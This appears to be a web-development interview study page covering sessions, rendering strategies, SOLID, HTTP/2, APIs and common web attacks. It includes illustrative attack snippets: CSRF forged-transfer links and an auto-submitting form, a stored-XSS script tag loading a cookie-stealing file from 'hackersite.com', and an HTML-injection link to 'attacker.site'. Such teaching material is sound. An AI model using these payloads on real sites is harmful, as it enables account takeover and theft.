+ #### _b. RAM cache utilization_
<p>Sticky sessions allow for more effective utilization of your application’s RAM cache, resulting in better responsiveness.</p>

<p>That said, sticky sessions also make it more difficult to keep servers in balance. A server can become overloaded if it accumulates too many sessions, or if specific sticky sessions require a high number of resources. This could result in your load balancer having to shift a client to a different server mid-session, resulting in data loss.</p>

### _2. Persistence using session cookies_

> There are two types of cookie-based session persistence: duration-based and application-controlled.

+ #### _a. Duration-based session persistence_
<p>Your load balancer issues a cookie that defines a specific timeframe for session stickiness. Each time the load balancer receives a client request, it checks whether this cookie is present.</p>

<p>After the specified duration elapses and the cookie expires, the session is not sticky anymore.</p>

+ #### _b. Application-controlled session persistence_
<p>Your application generates a cookie that determines the duration of session stickiness. The load balancer still issues its own session cookie on top of it, but it now follows the lifetime of the application cookie.</p>

<p>This makes sticky sessions more efficient, ensuring that users are never routed to a server after their local session cookie has already expired. However, it’s more complex to implement because it requires additional integration between the load balancer and the application.</p>
<br />

<h2><b><i>Question :- What is web application security?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Web application security is the process of protecting websites and online services against different security threats that exploit vulnerabilities in an application’s code. Common targets for web application attacks are content management systems (e.g., WordPress), database administration tools (e.g., phpMyAdmin) and SaaS applications.</p>

> <strong>Perpetrators consider web applications high-priority targets due to:</strong>

<p>The inherent complexity of their source code, which increases the likelihood of unattended vulnerabilities and malicious code manipulation.</p>

<p>High value rewards, including sensitive private data collected from successful source code manipulation.</p>

<p>Ease of execution, as most attacks can be easily automated and launched indiscriminately against thousands, or even tens or hundreds of thousands of targets at a time.</p>

<p>Organizations failing to secure their web applications run the risk of being attacked. Among other consequences, this can result in information theft, damaged client relationships, revoked licenses and legal proceedings.</p>

### _1. Web application vulnerabilities_
<p>Web application vulnerabilities are typically the result of a lack of input/output sanitization, which are often exploited to either manipulate source code or gain unauthorized access.</p>

> <strong>Such vulnerabilities enable the use of different attack vectors, including:</strong>
 
+ ### _a. SQL Injection_
<p>Occurs when a perpetrator uses malicious SQL code to manipulate a backend database so it reveals information. Consequences include the unauthorized viewing of lists, deletion of tables and unauthorized administrative access.</p>

+ ### _b. Cross-site Scripting (XSS)_
<p>XSS is an injection attack targeting users in order to access accounts, activate Trojans or modify page content. Stored XSS occurs when malicious code is injected directly into an application. Reflected XSStakes place when malicious script is reflected off of an application onto a user’s browser.</p>

+ ### _3. Remote File Inclusion_
<p>A hacker uses this type of attack to remotely inject a file onto a web application server. This can result in the execution of malicious scripts or code within the application, as well as data theft or manipulation.</p>

+ ### _4. Cross-site Request Forgery (CSRF)_
<p>An attack that could result in an unsolicited transfer of funds, changed passwords or data theft. It’s caused when a malicious web application makes a user’s browser perform an unwanted action in a site to which a user is logged on.</p>
<br />

<h2><b><i>Question :- What are the SOLID Principles?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

+ ### _1. Single responsibility principle_
<p>A class should have one and only one reason to change, meaning that a class should only have one job.</p>

+ ### _2. Open closed principle_
<p>Objects or entities should be open for extension, but closed for modification.</p>

+ ### _3. Liskov substitution principle_
<p>Let q(x) be a property provable about objects of x of type T. Then q(y) should be provable for objects y of type S where S is a subtype of T.</p>

<p>Functions that use pointers or references to base classes must be able to use objects of derived classes without knowing it.</p>

<p>All this is stating is that every subclass/derived class should be substitutable for their base/parent class.</p>

<p>In other words, as simple as that, a subclass should override the parent class methods in a way that does not break functionality from a client’s point of view.</p>

+ ### _4. Interface segregation principle_
<p>A client should never be forced to implement an interface that it doesn’t use or clients shouldn’t be forced to depend on methods they do not use.</p>

+ ### _5. Dependency Inversion principle_
<p>Entities must depend on abstractions not on concretions. It states that the high level module must not depend on the low level module, but they should depend on abstractions.</p>
<br />

<h2><b><i>Question :- What is Client Side Rendering?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>In a client-Side Rendered web application, JavaScript controls what is displayed on the page. Typically, instead of loading all the web content using the HTML documents, a JavaScript file is included to handle the dynamic architecture of the website loading.</p>

> <strong>This is what happens when the website is rendered on the client-side.</strong>
1. <p>A user sends a request to access the web content on a browser using the website address (link).</p>

2. <p>The server serves up the static files (CSS and HTML) to the client’s browser on the client’s first request for the website.</p>

3. <p>The client browser will download the HTML content first and then JavaScript. These HTML files link the JavaScript. This loading process happens as the user sees the loading symbols defined by the web developer. The site is not yet visible to the user.</p>

4. <p>After the browser downloads the JavaScript, content is dynamically generated on the client’s browser.</p>

5. <p>The web content becomes visible as the client navigates and interacts with the website.</p>

<p>
This process means that the initial load is prolonged. After initial load time, the website’s navigation will be super smooth and super fast, only having to make API calls to get the content dynamically.</p>

<p>The initial load is naturally slow since the browser is trying to load the initial run-time data of the website to the client’s browser.</p>

<p>After this is over, the web will load dynamically. The JavaScript framework controls the website navigation using a {Content Delivery Network}(/cdn-edge-compute-platform/) to process DOM in the client’s browser.</p>

<p>The process involves fetching and processing data on the client-side (browser) and not the web server, hence the name “client-side rendering”.</p>

<p>A great use case of Client-Side Rendering is a single-page application (SPA). In a SPA, each page is rendered on the client browser. The server only serves one single HTML document.</p>

<p>Once the HTML is loaded, the JavaScript frameworks such as React will control the website’s DOM structure on the browser. In this case, each page will load from the data history as fetched by the framework’s API. Once the initial load is over, accessing a different route or reloading the page will be super fast.</p>

<p>The JavaScript frameworks that supports client-side rendering development style includes React, Angular, and Vue.js.</p>

<p>Let’s take a simple example of CSR using Vue.js.</p>

<p>There are two main files here, the HTML mark-ups and the JavaScript file.</p>

<p>In most cases, content is wrapped inside containers divs with root ids to control states and data for the application.</p>
<br />

<h2><b><i>Question :- Server-Side Rendering (SSR)?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>SSR is one of the commonly used rendering solutions. It is pretty much the opposite of the client-side rendering.</p>

<p>With the SSR solution, rendering is conducted by the server. The user makes a request to the server; the server processes the HTML, CSS, and JavaScript on-demand and delivers a fully populated page to the user’s browser.</p>

<p>Unlike Client-Side Rendering, every subsequent time the user takes action to visit a different page, the rendering process repeats. The server will serve the page on demand every single time. The browser is constantly making requests to the server for every new page, and each request.</p>

<p>The downside of SSR is that it is resource-intensive and delays the content delivery to the user. It increases the page load time compared to single-paged apps. This is because the server has to render the dynamic content repeatedly. Whereas, on the CSR, the content is static and is displayed almost instant on page reload.</p>
<br />

<h2><b><i>Question :- Static-Site Generation (SSG)?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Basically, a Static-Site Generator is a program or a tool used to generate static HTML websites and pages based on raw data and templates. Static-Site Generator automates the process of having to code HTML pages manually.</p>

<p>These generators pre-build HTML pages and make them available to the user ahead of time. This means that whenever a user requests a page, it loads with no delay. This happens so fast as the site is static and the generator renders the pages at build time.</p>

<p>A close relative of Static-Site Generators is content management systems (CMS) such as WordPress. A content management tool is used to generate and manage web content and web pages. They both use the concept of templates to avoid writing, formatting, and coding the web pages manually.</p>

<p>In a CMS case, content is stored in the CMS databases, and when the user requests the page, the server queries this content from this database, fills it in a template that fits this web content, generates the requested page, and serves it to the user on the browser.</p>

<p>On the other hand, Static-Site Generation uses the same concept on templates to automatically generate the pages. However, unlike CMS, the content is static, and templates load ahead of time. The pages are instantly ready to be displayed on the user’s browser.</p>

<p>This means that the server makes no API calls to renders any HTML documents. The pages are rendered during the build-up phase. All of your pages are going to load super quickly because they’re already pre-cached, pre-generated, and pre-rendered.</p>
<br />

<h2><b><i>Question :- Pros & Cons of Client-Side Rendering?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

+ ### _1. Pros -_
<p>They are fast. Although the site’s first load might be slow, once rendered, other requested pages served instantaneously.</p>

+ ### _2. Cons -_
<p>They have prolonged initial load time. This increases the likelihood of poor user experience, and users can leave your site when they get frustrated waiting for the CSR to fully render the website.</p>

<p>Search engine optimization takes a hit. One of the biggest downsides of CSR is that it affects search engine robots. CSR uses JavaScript. This slows down search engine robots as they crawl on a website. Search engine robots crawl and index an HTML file page first.</p>

<p>This means that JavaScript content might be missed and not included during indexing, resulting in partial indexing and affecting the SEO. When the page is fully loaded, the site only loads one initial HTML mark-up. You will only have one meta tag for all pages.</p>

+ ### _3. When to use -_
<p>This approach fits well when you have a large number of users accessing your web content. The content is rendered once upon every user request.</p>

<p>This goes hand in hand if your application has a complex UI and a lot of dynamic content that doesn’t necessarily depend on SEO.</p>

<p>CSR is a good choice for hybrid web applications. A single-page app use-case will be if you want to create a website that will feel more like a mobile app. For example, Twitter, where you don’t have page refresh when you switch pages, you also have spinners when the data is loading, etc.</p>
<br />

<h2><b><i>Question :- Pros & Cons of Server-Side Rendering?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

+ ### _1. Pros -_
<p>It is the best when it comes to search engine optimization. Every page is rendered on the website’s server independently. Take a look at a blog website. Each blog post is an independent page and is fetched independently from the server. Thus you can insert meta tags based on the page’s content.</p>

<p>SSR allows page content to be focused and relevant to the social crawlers. Google and other search engine robots will thus be able to take account of your web page’s performance to enhance your web content ranking.</p>

+ ### _2. Cons -_
<p>With SSR, the page reloads, and visiting a new page has to hit a server request again. This comes with the burden of high memory usage and high processing power on the server. It consumes unnecessary internet bandwidth and will obviously increase the hosting cost.</p>

+ ### _3. When to use -_
<p>Every web page content is served independently. This would be a great chance to catch up with the social Crawlers to target a high SEO ranking.</p>

<p>It has an overall slow rendering speed, thus it fits well when you have fewer users, a simple UI, few pages, less dynamic data, and less interactivity.</p>
<br />

<h2><b><i>Question :- Pros & Cons of Static-Site Generation?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

+ ### _1. Pros -_
<p>They are ultra-fast. All of the content of your website is generated as HTML files ahead of time. When a user comes to your application and requests a home page or whatever page they request, the server will quickly respond and load it. It doesn’t have to do any processing. It doesn’t have to generate any HTML; it just serves it.</p>

<p>They are more secure when compared to dynamic websites. When you build a static site, you are giving the user accessing the website everything you have. There are no backend to hack or databases or text boxes to inject malicious code into.</p>

<p>A static website is plain and simple, just a collection of HTML files hosted on a server. Compared to other content management systems such as WordPress, where content is hosted on databases on the backend, which can be hacked, and malicious activity can be injected into your website.</p>

<p>They are straightforward to host. They have nothing to configure and no environments to set up. It is just as easy as uploading a couple of HTML files into a web server.</p>

<p>Hosting a static website is very cheap. They are not many resources to serve up a static website, hence the low bandwidth and memory usage, thus cutting the cost of hosting services. Hosting a web static can even be free. You can take all your static files and put them in hosting services such as Section or the GitHub pages.</p>

<p>You can host your website anywhere. You can host it on an s3 bucket or any cloud CDN, making your application easier to scale globally and serves data very quickly.</p>

+ ### _2. Cons -_
<p>The data served may be stale and old. The only way to update it is to build the application again, which can take some time. You still have to deploy the content to the CDN/server to see the updates. If your application needs to update, you’ll have to re-kick the build process off.</p>

<p>This can be mitigated by employing the concept of Incremental Static Regeneration (ISR), supported by Next.js. This way, you can get the latest data without having to rebuild your application fully.</p>

+ ### _3. When to use -_
<p>SSG fits well when you have a lot of static content; it is fast and improves loading time for static HTML files.</p>

<p>It is considered a good choice for SEO-ranked content.</p>
<br />

<h2><b><i>Question :- Web API Security?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What is an API -_
<p>An Application Programming Interface (API) is a software intermediary that allows your applications to communicate with one another. It provides routines, protocols, and tools for developers building software applications, while enabling the extraction and sharing of data in an accessible manner.</p>

<p>Web APIs connect between applications and other services or platforms, such as social networks, games, databases and devices.</p>

<p>Additionally, Internet of Things (IoT) applications and devices use APIs to gather data, or even control other devices. For example, a power company may use an API to adjust the temperature on a thermostat to save power.</p>

> <strong>Soap API and REST API</strong>
+ #### _SOAP (Simple Object Access Protocol) -_
<p>is an XML-based messaging protocol for exchanging information among computers. SOAP’s built-in WS-Security standard uses XML Encryption, XML Signature, and SAML tokens to deal with transactional messaging security considerations. SOAP also supports OASIS and W3C recommendations.</p>

<p>SOAP’s built-in standards and envelope-style of payload transport require more overhead compared to working with other API implementations, such as REST. However, organizations that require more comprehensive security and compliance may benefit from using SOAP.</p>

+ #### _REST (Representational State Transfer) -_
<p>It uses HTTP to obtain data and perform operations on remote computer systems. It supports SSL authentication and HTTPS to achieve secure communication.</p>

<p>REST uses the JSON standard for consuming API payloads, which simplifies data transfer over browsers. REST is stateless – each HTTP request contains all necessary information, meaning that neither the client nor the server are required to retain any data to satisfy the request. Unlike SOAP, which requires parsing and routing for each request to function on a local web service, REST leverages standard HTTP requests and does not require the repackaging of data.</p>

### _2. API security threats -_
<p>APIs often self-document information, such as their implementation and internal structure, which can be used as intelligence for a cyber-attack. Additional vulnerabilities, such as weak authentication, lack of encryption, business logic flaws and insecure endpoints make APIs vulnerable to the attacks outlined below.</p>

+ #### _a. Man In The Middle (MITM) -_
<p>A man in the middle (MITM) attack involves an attacker secretly relaying, intercepting or altering communications, including API messages, between two parties to obtain sensitive information.</p>

<p>For example, a perpetrator can act as a man in the middle between an API issuing a session token in an HTTP header and a user’s browser. Intercepting that session token would grant access to the user’s account, which might include personal details, such as credit card information and login credentials.</p>

+ #### _b. API injections (XSS and SQLi) -_
<p>In a code injection attack, malicious code is inserted into a vulnerable software program to stage an attack, such as cross site scripting (XSS) and SQL injection (SQLi).</p>

<p>For example, a perpetrator can inject a malicious script into a vulnerable API, i.e., one that fails to perform proper filter input, escape output (FIEO), to launch an XSS attack targeting end users’ browsers. Additionally, malicious commands could be inserted into an API message, such as an SQL command that deletes tables from a database.</p>

<p>Any web API requiring parsers or processers is vulnerable to attack. For example, a code generator that includes parsing for JSON code, and doesn’t sanitize input properly, is susceptible to the injection of executable code that runs in the development environment.</p>

+ #### _c. Distributed denial of service (DDoS) -_
<p>In a distributed denial-of-service (DDoS) attack, multiple systems flood the bandwidth or resources of a targeted system, usually one or more web servers. A DDoS attack on a web API attempts to overwhelm its memory and capacity by flooding it with concurrent connections, or by sending/requesting large amounts of information in each request.</p>

<p>For example, a DDoS attack on the FCC website in early 2017 used commercial cloud services to issue a massive amount of API requests to a commenting system. This consumed available machine resources and crowded out human commenters, eventually causing the website to crash.</p>

### _3. API security best practices -_
> <strong>Securing your API against the attacks outlined above should be based on:</strong>
+ ### _a. Authentication -_
<p>Determining the identity of an end user. In a REST API, basic authentication can be implemented using the TLS protocol, but OAuth 2 and OpenID Connect are more secure alternatives.</p>

+ ### _b. Authorization -_
<p>Determining the resources an identified user can access. An API should be built and tested to prevent users from accessing API functions or operations outside their predefined role. For example, a read-only API client shouldn’t be allowed to access an endpoint providing admin functionality.</p>
<br />

<h2><b><i>Question :- Cross site request forgery (CSRF) attack?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What is CSRF? -_
<p>Cross site request forgery (CSRF), also known as XSRF, Sea Surf or Session Riding, is an attack vector that tricks a web browser into executing an unwanted action in an application to which a user is logged in.</p>

<p>A successful CSRF attack can be devastating for both the business and user. It can result in damaged client relationships, unauthorized fund transfers, changed passwords and data theft—including stolen session cookies.</p>

<p>CSRFs are typically conducted using malicious social engineering, such as an email or link that tricks the victim into sending a forged request to a server. As the unsuspecting user is authenticated by their application at the time of the attack, it’s impossible to distinguish a legitimate request from a forged one.</p>

### _2. CSRF example -_
<p>Before executing an assault, a perpetrator typically studies an application in order to make a forged request appear as legitimate as possible.</p>

<p>For example, a typical GET request for a $100 bank transfer might look like:</p>

``` http
GET http://netbank.com/transfer.do?acct=PersonB&amount=$100 HTTP/1.1
```

<p>A hacker can modify this script so it results in a $100 transfer to their own account. Now the malicious request might look like:</p>

``` http
GET http://netbank.com/transfer.do?acct=AttackerA&amount=$100 HTTP/1.1
```
<p>A bad actor can embed the request into an innocent looking hyperlink:</p>

``` html
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>
```

<p>Next, he can distribute the hyperlink via email to a large number of bank customers. Those who click on the link while logged into their bank account will unintentionally initiate the $100 transfer.</p>

<p>Note that if the bank’s website is only using POST requests, it’s impossible to frame malicious requests using a < a > href tag. However, the attack could be delivered in a < form > tag with automatic execution of the embedded JavaScript.</p>

<p>This is how such a form may look like:</p>

``` html
<body onload="document.forms[0].submit()">
    <form action="http://netbank.com/transfer.do" method="POST">
        <input type="hidden" name="acct" value="AttackerA"/>
        <input type="hidden" name="amount" value="$100"/>
        <input type="submit" value="View my pictures!"/>
    </form>
</body>
```

### _3. Methods of CSRF mitigation -_
<p>A number of effective methods exist for both prevention and mitigation of CSRF attacks. From a user’s perspective, prevention is a matter of safeguarding login credentials and denying unauthorized actors access to applications.</p>

> <strong>Best practices include:</strong>
+ Logging off web applications when not in use
+ Securing usernames and passwords
+ Not allowing browsers to remember passwords
+ Avoiding simultaneously browsing while logged into an application

<p>For web applications, multiple solutions exist to block malicious traffic and prevent attacks. Among the most common mitigation methods is to generate unique random tokens for every session request or ID. These are subsequently checked and verified by the server. Session requests having either duplicate tokens or missing values are blocked. Alternatively, a request that doesn’t match its session ID token is prevented from reaching an application.</p>

<p>Double submission of cookies is another well-known method to block CSRF. Similar to using unique tokens, random tokens are assigned to both a cookie and a request parameter. The server then verifies that the tokens match before granting access to the application.</p>

<p>While effective, tokens can be exposed at a number of points, including in browser history, HTTP log files, network appliances logging the first line of an HTTP request and referrer headers, if the protected site links to an external URL. These potential weak spots make tokens a less than full-proof solution.</p>
<br />

<h2><b><i>Question :- Cross site scripting (XSS) attacks?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What is cross site scripting (XSS) -_
<p>Cross site scripting (XSS) is a common attack vector that injects malicious code into a vulnerable web application. XSS differs from other web attack vectors (e.g., SQL injections), in that it does not directly target the application itself. Instead, the users of the web application are the ones at risk.</p>

<p>A successful cross site scripting attack can have devastating consequences for an online business’s reputation and its relationship with its clients.</p>

<p>Depending on the severity of the attack, user accounts may be compromised, Trojan horse programs activated and page content modified, misleading users into willingly surrendering their private data. Finally, session cookies could be revealed, enabling a perpetrator to impersonate valid users and abuse their private accounts.</p>

<p>Cross site scripting attacks can be broken down into two types: stored and reflected.</p>

<p>Stored XSS, also known as persistent XSS, is the more damaging of the two. It occurs when a malicious script is injected directly into a vulnerable web application.</p>

<p>Reflected XSS involves the reflecting of a malicious script off of a web application, onto a user’s browser. The script is embedded into a link, and is only activated once that link is clicked on.</p>

### _2. What is stored cross site scripting -_
<p>To successfully execute a stored XSS attack, a perpetrator has to locate a vulnerability in a web application and then inject malicious script into its server (e.g., via a comment field).</p>

<p>One of the most frequent targets are websites that allow users to share content, including blogs, social networks, video sharing platforms and message boards. Every time the infected page is viewed, the malicious script is transmitted to the victim’s browser.</p>

### _3. Stored XSS attack example -_
<p>While browsing an e-commerce website, a perpetrator discovers a vulnerability that allows HTML tags to be embedded in the site’s comments section. The embedded tags become a permanent feature of the page, causing the browser to parse them with the rest of the source code every time the page is opened.</p>

<p>The attacker adds the following comment: Great price for a great item! Read my review below</p>

``` html
<script src=”http://hackersite.com/authstealer.js”> </script>
```

<p>From this point on, every time the page is accessed, the HTML tag in the comment will activate a JavaScript file, which is hosted on another site, and has the ability to steal visitors’ session cookies.</p>

<p>Using the session cookie, the attacker can compromise the visitor’s account, granting him easy access to his personal information and credit card data. Meanwhile, the visitor, who may never have even scrolled down to the comments section, is not aware that the attack took place.</p>

<p>Unlike a reflected attack, where the script is activated after a link is clicked, a stored attack only requires that the victim visit the compromised web page. This increases the reach of the attack, endangering all visitors no matter their level of vigilance.</p>

<p>From the perpetrator’s standpoint, persistent XSS attacks are relatively harder to execute because of the difficulties in locating both a trafficked website and one with vulnerabilities that enables permanent script embedding.</p>
<br />

<h2><b><i>Question :- SQL (Structured query language) Injection?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What is SQL injection -_
<p>SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This information may include any number of items, including sensitive company data, user lists or private customer details.</p>

<p>The impact SQL injection can have on a business is far-reaching. A successful attack may result in the unauthorized viewing of user lists, the deletion of entire tables and, in certain cases, the attacker gaining administrative rights to a database, all of which are highly detrimental to a business.</p>

<p>When calculating the potential cost of an SQLi, it’s important to consider the loss of customer trust should personal information such as phone numbers, addresses, and credit card details be stolen.</p>

<p>While this vector can be used to attack any SQL database, websites are the most frequent targets.</p>

### _2. What are SQL queries -_
<p>SQL is a standardized language used to access and manipulate databases to build customizable data views for each user. SQL queries are used to execute commands, such as data retrieval, updates, and record removal. Different SQL elements implement these tasks, e.g., queries using the SELECT statement to retrieve data, based on user-provided parameters.</p>

> <strong>A typical eStore’s SQL database query may look like the following:</strong>

``` sql
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = ItemNumber
```

> <strong>From this, the web application builds a string query that is sent to the database as a single SQL statement:</strong>

``` sql
sql_query= "
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = " & Request.QueryString("ItemID")
```

> <strong>A user-provided input http://www.estore.com/items/items.asp?itemid=999 can then generates the following SQL query:</strong>

``` sql
SELECT ItemName, ItemDescription
FROM Item
WHERE ItemNumber = 999
```

<p>As you can gather from the syntax, this query provides the name and description for item number 999.</p>

### _4. Types of SQL Injections -_
> <strong>SQL injections typically fall under three categories: </strong>

+ In-band SQLi (Classic), 
+ Inferential SQLi (Blind) 
+ Out-of-band SQLi. 
<br />

<h2><b><i>Question :- What is Slowloris?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Developed by Robert “RSnake” Hansen, Slowloris is DDoS attack software that enables a single computer to take down a web server. Due the simple yet elegant nature of this attack, it requires minimal bandwidth to implement and affects the target server’s web server only, with almost no side effects on other services and ports.</p>

<p>Slowloris has proven highly-effective against many popular types of web server software, including Apache 1.x and 2.x.</p>

### _1. Attack description -_
<p>Slowloris works by opening multiple connections to the targeted web server and keeping them open as long as possible. It does this by continuously sending partial HTTP requests, none of which are ever completed. The attacked servers open more and connections open, waiting for each of the attack requests to be completed.</p>

<p>Periodically, the Slowloris sends subsequent HTTP headers for each request, but never actually completes the request. Ultimately, the targeted server’s maximum concurrent connection pool is filled, and additional (legitimate) connection attempts are denied.</p>

<p>By sending partial, as opposed to malformed, packets, Slowloris can easily slip by traditional Intrusion Detection systems.</p>

<p>Named after a type of slow-moving Asian primate, Slowloris really does win the race by moving slowly and steadily. A Slowloris attack must wait for sockets to be released by legitimate requests before consuming them one by one.</p>

<p>For a high-volume web site, this can take some time. The process can be further slowed if legitimate sessions are reinitiated. But in the end, if the attack is unmitigated, Slowloris—like the tortoise—wins the race.</p>

<p>If undetected or unmitigated, Slowloris attacks can also last for long periods of time. When attacked sockets time out, Slowloris simply reinitiates the connections, continuing to max out the web server until mitigated.</p>

<p>Designed for stealth as well as efficacy, Slowloris can be modified to send different host headers in the event that a virtual host is targeted, and logs are stored separately for each virtual host.</p>

<p>More importantly, in the course of an attack, Slowloris can be set to suppress log file creation. This means the attack can catch unmonitored servers off-guard, without any red flags appearing in log file entries.</p>
<br />

<h2><b><i>Question :- Personally Identifiable Information (PII)?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

### _1. What Is Personally Identifiable Information (PII) -_
<p>Personally Identifiable Information (PII) is a legal term pertaining to information security environments. While PII has several formal definitions, generally speaking, it is information that can be used by organizations on its own or with other information to identify, contact, or locate a single person, or to identify an individual in context.</p>

<p>Non-sensitive PII can be transmitted in unsecure form without causing harm to an individual. Sensitive PII must be transmitted and stored in secure form, for example, using encryption, because it could cause harm to an individual, if disclosed.</p>

<p>Organizations use the concept of PII to understand which data they store, process and manage that identifies people and may carry additional responsibility, security requirements, and in some cases legal or compliance requirements.</p>
<br />

<h2><b><i>Question :- What is HTML Injection?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Hypertext Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify a web page presented by a web application to its users. Attackers take advantage of the fact that the content of a web page is often related to a previous interaction with users. When applications fail to validate user data, an attacker can send HTML-fomatted text to modify site content that gets presented to other users. A specifically crafted query can lead to inclusion in the web page of attacker-controlled HTML elements which change the way the application content gets exposed to the web.</p>

### _1. Detailed Description -_
<p>HTML is the language that determines how application data (like a products’ catalog) gets presented to users in their web browser. This language contains visualization commands, like the color of the page’s background and the size of embedded pictures. It also contains links to other web pages, and additional commands intended for the user’s browser. Furthermore, automated tools that collect useful information from the web on behalf of users often do so by systematically accessing and parsing the relevant information in the application’s HTML pages.</p>

<p>In modern interactive web pages, the content of a web page often reflects the results of processing previous user actions. If the user’s input is not validated and the application is vulnerable, an attacker can craft and send input to the application that lets him inject pieces of his HTML code into the HTML content of the application’s response.</p>

<p>HTML injection attack is closely related to Cross-site Scripting (XSS). HTML injection uses HTML to deface the page. XSS, as the name implies, injects JavaScript into the page. Both attacks exploit insufficient validation of user input.</p>

<p>A simple example of potential HTML Injection is an application’s “Search” form, in which the user enters a query text. When the user submits the query, the application responds by dynamically generating a web page that shows matching results. This results page often shows the original query text to let the user see the context of these results. If the embedded query text contains syntactically correct HTML, it may add attacker-controlled text, images and links to this generated response page. In the following example, if the application does not validate the user-query before embedding it in the simplified results page, the attacked can add content to the page by sending a query that contains appropriate HTML elements (tags to close and open < h2 > context), producing a valid HTML after the injection:</p>

> <strong>Web application template for search results page:</strong>
``` html
<html>
    <h1>Here are the results that match your query: </h1>
    <h2>{user-query}</h2>
    <ol>
        <li>Result A
        <li>Result B
    </ol>
</html>
```
> <strong>User query text:</strong>

``` html
 </h2>special offer <a href=www.attacker.site>malicious link</a><h2>
```

> <strong>Generated results page after injection:</strong>

``` html
<html>
    <h1>Here are the results that match your query: </h1>
    <h2></h2>special offer <a href=www.attacker.site>malicious link</a><h2></h2>
    <ol>
        <li>Result A
        <li>Result B
    </ol>
</html>
```

<p>Now every user that will browse to the search results page will see the link injected by the attacker. If an unsuspecting user trusts the applications and clicks on the injected link it now contains, he is suddenly seeing content from an attacker-controlled domain.</p>

<p>A typical application use-case for storing one user’s input and showing it to other users is when an application contains pages where users can post comments to the original content of the page or interact with each other. This is another example where application vulnerabilities can lead to HTML injection.</p>

### _2. Prevention -_
<p>The most common way of detecting HTML injection is by looking for HTML elements in the incoming HTTP stream that contains the user input. A naïve validation of user input simply removes any HTML-syntax substrings (like tags and links) from any user-supplied text. However, there are many instances where the application expects HTML input from the user. For example, this happens when the user submits visually-formatted text or text containing links to legitimate sites with related content. To avoid false positives, the security mechanism that detects possible injections and protects the application should learn in what application context user input is allowed to contain HTML. Also, it should be able to stop HTML input if it learns that such text is pasted as-is in web page generated by vulnerable application components.</p>
<br />

<h2><b><i>Question :- What is the HTTP/2 Protocol?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Hypertext Transfer Protocol (HTTP) is a set of standards allowing internet users to exchange website information. There have been four HTTP iterations since its introduction in 1991.</p>

<p>HTTP/2 was released in 2015 as a major revision to the HTTP/1.1 protocol. It was derived from the SPDY protocol as a way to improve the online experience by speeding up page loads and reducing round-trip time (RTT), especially on resource-heavy web pages.</p>

<p>Here we will be discussing why the new protocol was needed, its evolution from SPDY, how it differs from HTTP/1.1 and how a CDN can assist in making your site content HTTP/2 compatible.</p>

### _1. From SPDY to HTTP/2 -_
<p>HTTP/1.1 was the third version of HTTP and the standard protocol for over 15 years. It introduced persistent connections for improved performance and laid the foundation for standard requests, such as GET, HEAD, PUT, and POST.</p>

<p>As websites became more resource-intensive, however, HTTP/1.1’s limitations began to show. Specifically, its use of one outstanding request per TCP connection created significant overhead, slowing down page load times.</p>

<p>In 2010, Google released the SPDY protocol as a way of modifying how HTTP handles requests and responses. Its focus was on reducing latency via TCP pipelining and providing mandatory compression, amongst other features.</p>

<p>While HTTP/2 was initially modeled after SPDY, it was soon modified to include unique features, including a fixed header compression algorithm, (in contrast to SPDY’s dynamic stream-based compression). Following its release, Google announced that it would remove support for SPDY in favor of HTTP/2.</p>

### _2. HTTP/1.1 vs. HTTP/2 Protocol -_
> <strong>HTTP/2 improved on HTTP/1.1 in a number of ways that allowed for speedier content delivery and improved user experience, including:</strong>

+ #### _a. Binary protocols -_
<p>Binary protocols consume less bandwidth, are more efficiently parsed and are less error-prone than the textual protocols used by HTTP/1.1. Additionally, they can better handle elements such as whitespace, capitalization and line endings.</p>

+ #### _b. Multiplexing  -_
<p>HTTP/2 is multiplexed, i.e., it can initiate multiple requests in parallel over a single TCP connection. As a result, web pages containing several elements are delivered over one TCP connection. These capabilities solve the head-of-line blocking problem in HTTP/1.1, in which a packet at the front of the line blocks others from being transmitted.</p>

+ #### _c. Header compression -_
<p>HTTP/2 uses header compression to reduce the overhead caused by TCP’s slow-start mechanism.</p>

+ #### _d. Server push -_
<p>HTTP/2 servers push likely-to-be-used resources into a browser’s cache, even before they’re requested. This allows browsers to display content without additional request cycles.</p>

+ #### _e. Increased security -_
<p>Web browsers only support HTTP/2 via encrypted connections, increasing user and application security.</p>
<br />

<h2><b><i>Question :- What are load balancing algorithms?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Effective load balancers intelligently determine which device within a given server farm is best able to process an incoming data packet. Doing so requires algorithms programmed to distribute loads in a specific way.</p>

<p>Algorithms vary widely, depending on whether a load is distributed on the network or application layer. Algorithm selection impacts the effectiveness of load distribution mechanisms and, consequently, performance and business continuity.</p>

<p>Here we will be discussing the pros and cons of several widely used algorithms found in both network and application layer load balancing solutions.</p>

> Read the link 
    >> https://www.imperva.com/learn/availability/load-balancing-algorithms/
<br />

<h2><b><i>Question :- What is two factor authentication (2FA)?</i></b></h2>
<h3><b><i>Answer - </i></b></h3>

<p>Two-factor authentication (2FA), a type of multi-factor authentication (MFA), is a security process that cross-verifies users with two different forms of identification, most commonly knowledge of an email address and proof of ownership of a mobile phone.</p>

<p>Used on top of the regular username/password verification, 2FA bolsters security by making it more difficult for intruders to gain unauthorized access, even if a perpetrator gets past the first authentication step (e.g., brute forces a username and password).</p>

